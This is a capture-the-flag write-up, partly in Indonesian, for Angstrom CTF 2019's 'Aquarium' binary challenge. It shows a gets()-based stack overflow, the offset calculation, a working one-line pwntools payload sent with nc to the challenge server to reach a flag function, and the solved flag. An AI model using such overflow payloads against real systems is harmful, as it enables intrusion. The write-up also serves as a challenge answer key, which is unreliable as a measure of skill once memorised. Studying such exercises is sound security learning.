# __Angstrom CTF 2019__ 
## _Aquarium_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Binary | 50 | l0l

**Description:** 

> 50 points 305 solves
>
> Here's a nice little program that helps you manage your fish tank.
>
> Run it on the shell server at /problems/2019/aquarium/ or connect with nc shell.actf.co 19305.
>
> Author: kmh11
>
> Given : [binary](./aquarium) and [source](./aquarium.c)

**Hints:**

> What does the gets function do?
>

### Aquarium
```
aquarium: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=534b3b33b4d9e8dfed4eebeeb9a1da06e886a501, not stripped

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

```
gdb-peda$ info func
...
0x00000000004011b0  frame_dummy
0x00000000004011b6  flag
0x00000000004011c9  create_aquarium
0x000000000040139f  main
...
```

### Aquarium Source Code
```c
...
void flag() {
	system("/bin/cat flag.txt");
}
...
struct fish_tank create_aquarium() {
	struct fish_tank tank;

	printf("Enter the number of fish in your fish tank: ");
	scanf("%d", &tank.fish);
	getchar();

	printf("Enter the size of the fish in your fish tank: ");
	scanf("%d", &tank.fish_size);
	getchar();

	printf("Enter the amount of water in your fish tank: ");
	scanf("%d", &tank.water);
	getchar();

	printf("Enter the width of your fish tank: ");
	scanf("%d", &tank.width);
	getchar();

	printf("Enter the length of your fish tank: ");
	scanf("%d", &tank.length);
	getchar();

	printf("Enter the height of your fish tank: ");
	scanf("%d", &tank.height);
	getchar();

	printf("Enter the name of your fish tank: ");
	char name[50];
	gets(name);

	strcpy(name, tank.name);
	return tank;
}
...
```

#### Solve
Terlihat pada `struct` tank terdapat fungsi `gets` (vulnerable thd buffer overflow) yang dipanggil saat meminta input nama. Selain itu sudah disediakan juga fungsi `flag` yang akan menampilkan flag. 

##### Cari offset buffer
```
   0x0000000000401318 <+335>:   lea    rax,[rbp-0x90]
   0x000000000040131f <+342>:   mov    rdi,rax
   0x0000000000401322 <+345>:   mov    eax,0x0
   0x0000000000401327 <+350>:   call   0x401090 <gets@plt>
```
Dari sini kita tahu bahwa butuh padding 0x90 + 8 bytes(rbp) untuk dapat overwrite return address.

### Payload
```
python2 -c "from pwn import p64;print '1\n'*6+'A'*(0x90+8)+p64(0x00000000004011b6)" | nc shell.actf.co 19305
```

### Flag 
actf{overflowed_more_than_just_a_fish_tank}
